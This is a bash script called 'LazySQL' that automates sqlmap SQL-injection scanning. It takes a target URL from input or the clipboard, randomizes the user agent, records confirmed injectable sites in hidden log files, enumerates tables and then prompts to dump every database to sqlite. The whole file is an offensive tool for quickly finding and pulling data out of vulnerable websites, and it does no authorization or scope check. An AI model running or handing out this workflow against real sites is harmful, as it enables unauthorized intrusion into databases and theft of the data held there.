#!/bin/bash 
#Automated Sqlmap#

if command -v unbuffer >/dev/null 2>&1
 then
sleep 0
else
sudo apt-get install expect-dev
fi


if command -v tput >/dev/null 2>&1
 then
sleep 0
else
sudo apt-get install ncurses-bin
fi

echo "  _                    ____   ___  _     ";
echo " | |    __ _ _____   _/ ___| / _ \| |    ";
echo " | |   / _\` |_  / | | \___ \| | | | |    ";
echo " | |__| (_| |/ /| |_| |___) | |_| | |___ ";
echo " |_____\__,_/___|\__, |____/ \__\_\_____|";
echo "                 |___/                   ";
echo
echo
tput bold;
echo "LazySQL script is used for fast sqlmap scanning and dumping."
echo "If no URL is specified, LazySQL uses the last clipboard entry."
echo "If the number of threads is not specified, LazySQL uses "3" as standard value."
echo
echo "Use "lsql --fast" to start with copied url and default settings."
echo
echo "Confirmed injections can be found in either: ~/.lsql.vul (including timestamp) and ~/lsql.list (plain)."
echo "Use "lsql --list" to show all confirmed url's."
echo 
echo "Made for private use by Inbell1s."
echo
tput sgr0

if [ "$1" == --list ]; then
	tput smso;
echo "Confirmed Url's:"
	tput rmso;	
cat ~/.lsql.vul
elif [ "$1" == --fast ]; then
url=$(xclip -selection c -o)
Threads="3"
extra=""

while true; do
	if echo $url | grep -q -v "http"; then
		tput rmso;
		tput smso;
		echo "Url does not contain "http or https""
		tput rmso;
		echo -ne '\007'
		echo
		echo "Valid url:"
		read -r url
			if [ -z "$url" ]; then
                		url=$(xclip -selection c -o)
		        fi

	else
		echo
		tput smso;
		echo "Using url: $url"
		tput rmso;
		break
	fi
done

else


##Input##
echo "URL:"
read -r url
	if [ -z "$url" ]; then
		url=$(xclip -selection c -o)
	fi

while true; do
	if echo $url | grep -q -v "http"; then
		tput rmso;
		tput smso;
		echo "Url does not contain "http or https""
		tput rmso;
		echo -ne '\007'
		echo
		echo "Valid url:"
		read -r url
			if [ -z "$url" ]; then
                		url=$(xclip -selection c -o)
		        fi
             elif echo $url | grep -q $url ~/lsql.no; then
		tput smso;
		echo "Previous scan detected uninjectable url."
		tput rmso;
		echo -ne '\007'
		sleep 2
		exit 0
	else
		echo
		tput smso;
		echo "Using url: $url"
		tput rmso;
		break
	fi
done

echo
echo "Threads:"
read -r Threads
	if [ -z "$Threads" ]; then
		Threads=3
		tput smso;
  echo "Starting with 3 Threads." 
tput rmso;

	fi

echo "Extra"
read -r extra

fi

unbuffer sqlmap --random-agent --batch --threads "$Threads" --dbs -u "$url" $extra | tee lsql.log 

echo
echo
tput smso;
echo "Used command:"
tput rmso;
echo "sqlmap --random-agent --batch --threads '"$Threads"' --dbs -u '"$url"' "$extra""
echo
echo "Link:"
echo $url
echo
if  grep -q "back-end DBMS:" lsql.log; then
now=$(date)
	if grep -q "$url" ~/.lsql.vul; then
	tput smso;
	echo "Previously added url!"
	else
	echo "Added to log!"
	tput rmso;
fi
echo "$url - $now" >> ~/.lsql.vul
echo "$url" >> ~/lsql.list
tput smso;
echo
echo
echo "Injection found, next command:"
tput rmso;
echo "sqlmap --random-agent -o --batch --no-cast --exclude-sysdb --tables -u '"$url"'"
echo
echo
sqlmap --random-agent -o --batch --no-cast --exclude-sysdb --tables -u ""$url""
else 
echo
echo "$url" >> ~/lsql.no
tput smso;
echo "No injection found."
tput rmso;
exit 0
fi

##Dump option##
if grep -q "$url" ~/.lsql.vul; then
	
while true; do
    read -p "Do you wish to dump the database?: Y/n)" yn
	case $yn in
        [Y]* ) break;;
        [n]* ) exit;;
        * ) break;;
    esac
done
echo
tput smso;
echo "Starting database dump!"
tput rmso;
sleep 3

sqlmap --random-agent -o --batch --no-cast --exclude-sysdb --dump-all --dump-format sqlite -u ""$url""


else
exit 0
fi

exit 0
